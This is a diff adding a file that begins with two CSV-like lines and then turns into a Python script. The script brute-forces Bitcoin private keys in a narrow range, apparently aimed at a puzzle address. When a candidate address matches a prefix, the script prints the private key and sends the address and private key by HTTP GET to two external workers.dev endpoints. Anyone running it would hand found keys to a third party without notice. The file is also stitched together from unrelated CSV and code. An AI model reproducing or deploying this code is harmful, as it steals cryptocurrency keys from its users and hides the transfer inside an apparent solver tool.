@@ -1,0 +1,185 @@
+Vcard,TimeStamp
+Base58@13zb1h,1726898076013
+import ecdsa
+import hashlib
+import base58
+import time
+import json
+import sys
+import requests
+from tqdm import tqdm
+
+
+# global
+conta10 = 0
+conta20 = 0
+conta30 = 0
+conta40 = 0
+conta50 = 0
+conta60 = 0
+
+inicio_total = time.time()  # Tempo inicial
+
+
+def corresponde(str1, str2):
+    len_str1 = len(str1)
+    len_str2 = len(str2)
+    min_len = min(len_str1, len_str2)
+    matching_chars = sum(1 for c1, c2 in zip(str1, str2) if c1 == c2)
+    return (matching_chars / min_len) * 100
+
+def analisar_chave(chave):
+    global conta10
+    global conta20
+    global conta30
+    global conta40
+    global conta50
+    global conta60
+    
+    credito = 0   
+    for bit in chave:      
+        if bit == '1' :
+            credito = credito + 1
+            
+
+    if credito > 10 and credito < 20 : conta10 = conta10 + 1
+    if credito > 20 and credito < 30 : conta20 = conta20 + 1
+    if credito > 30 and credito < 40 : conta30 = conta30 + 1
+    if credito > 40 and credito < 50 : conta40 = conta40 + 1
+    if credito > 50 and credito < 60 : conta50 = conta50 + 1
+    if credito > 60 and credito < 70 : conta60 = conta60 + 1
+
+       
+         
+    return credito
+
+
+def chavebitcoin(iniciohex, finalhex, premio):
+    inicioint = int(iniciohex, 16)
+    finalint  = int(finalhex, 16)
+    read_size = 10000000
+    skip_size = 1000000000000000 # Salto de 1 Quatrilhão
+
+    numerocompleto = 0
+    semChave = 0
+    semDesafio = 0
+    naoDesafio = 0
+
+    current = inicioint
+    
+    while current <= finalint:
+        questao = min(current + read_size - 1, finalint)
+
+
+        for privadaint in tqdm(range(current, questao + 1), desc="Progresso", unit="chaves", file=sys.stdout):
+            privadahex = format(privadaint, 'x').zfill(64)
+            privadabyt = bytes.fromhex(privadahex)
+            
+            saldo = analisar_chave(bin(privadaint))  # Função de análise de saldo
+            
+            if saldo > 20 and saldo < 30 :           # or saldo > 33 and saldo < 35:   Analisar o crédito de 31 bits e 34 bits
+                sk = ecdsa.SigningKey.from_string(privadabyt, curve=ecdsa.SECP256k1)
+                vk = sk.get_verifying_key()
+
+                publicabyt = bytes.fromhex("04") + vk.to_string()
+                algoritmo = hashlib.sha256(publicabyt).digest()
+                algointeiro = int.from_bytes(algoritmo, byteorder='big')
+                
+                # if algointeiro < 4.5*10**76 and algointeiro > 2.5*10**76:  # Intervalo de 77 casas decimais
+                ripemd160 = hashlib.new('ripemd160', algoritmo).digest()
+                ripemd160_hex = ripemd160.hex()
+                
+                # Verifica o RIPEMD-160( 20d45a6a762535700ce9e0b216e31994335db8a5 )
+                if  ripemd160_hex.startswith("20"): 
+                    extendida = b'\x00' + ripemd160
+                    checksum = hashlib.sha256(hashlib.sha256(extendida).digest()).digest()[:4]
+                    address = extendida + checksum
+                    bitcoin = base58.b58encode(address).decode()
+
+                    percentual = corresponde(premio, bitcoin)
+                    
+                    if percentual > numerocompleto:
+                        numerocompleto = percentual
+                        wallet = bitcoin
+
+                    if percentual > 0 and bitcoin.startswith("13zb1h"):
+                        valor_saldo = abs(saldo)
+
+                        # Exibir chave privada em hexadecimal e endereço Bitcoin
+                        print(f"\nChave Privada (hexadecimal): {privadahex}")
+                        print(f"Endereço Bitcoin (crédito): {bitcoin}")
+                        print(f"Percentual de Correspondência: {percentual:.2f}%")
+                        print(f"Conta(bits): {valor_saldo} bits")
+                        print(f"Distância (decimal): {privadaint} | Distância (hexadecimal): {privadahex}\n")
+
+                        # URL base e requisição HTTP
+                        base_url = "https://cryptoreal.eletron-bit.workers.dev/put"
+                        dns_url = "https://dns.eletron-bit.workers.dev/put"
+                        url_completa = f"{base_url}/{bitcoin}/{privadahex}"
+                        dns_completo = f"{dns_url}/{privadaint}/{privadahex}"
+
+                        response_url = requests.get(url_completa)
+                        response_dns = requests.get(dns_completo)
+
+                        # Exibir status das requisições
+                        print("Status:", response_url.status_code, "/", response_dns.status_code)
+
+
+
+
+            if semDesafio > 100000000 :    # Marca de 100 Milhões
+                print("\n\n")
+                print("Crédito de 10 bits:", conta10)
+                print("Crédito de 20 bits:", conta20)
+                print("Crédito de 30 bits:", conta30)
+                print("Crédito de 40 bits:", conta40)
+                print("Crédito de 50 bits:", conta50)
+                print("Crédito de 60 bits:", conta60)
+                print(f"Distância (decimal): {privadaint} | {privadahex}\n")
+                
+                inicio_lote = time.time()  # Tempo inicial do lote    
+                semDesafio = 1
+
+                
+            else :
+
+                semDesafio += 1
+                naoDesafio += 1
+
+
+
+            if naoDesafio > 1000000000 :
+            
+                naoDesafio = 1
+                
+                # Tempo e média por lote de chaves
+                fim_lote = time.time()
+                tempo_gasto = fim_lote - inicio_lote
+                chaves_processadas = questao - current + 1
+                print("\n\n------------------------------------------------------------")
+                print(f"Tempo gasto para este lote: {tempo_gasto:.2f} segundos")
+                print(f"Chaves processadas: {chaves_processadas}")
+                print(f"Média por bilhão de chaves: {(tempo_gasto / chaves_processadas) * 1e9:.2f} segundos por bilhão")
+                print("------------------------------------------------------------")
+
+
+        current += read_size + skip_size
+        
+    # Finalizando com o tempo total gasto
+    fim_total = time.time()
+    tempo_total = fim_total - inicio_total
+    print(f"\nTempo total de execução: {tempo_total:.2f} segundos")
+
+
+
+
+if __name__ == "__main__":
+    iniciohex = "00000000000000000000000000000000000000000000000370470de4eb6dc202" # Última análise em 18-09-2024( 63420682753476583681 )
+    finalhex  = "0000000000000000000000000000000000000000000000040000000000000000" # Tempo Médio de 1h para cada 123.000.000 de Chaves Privadas + 29M
+    premio    = "13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so"
+    chavebitcoin(iniciohex, finalhex, premio)
+	
+    # Chaves processadas: 27 000 000 ( 27 Bilhões )
+    # Média por bilhão de chaves: 1988.30 segundos por bilhão
+
+
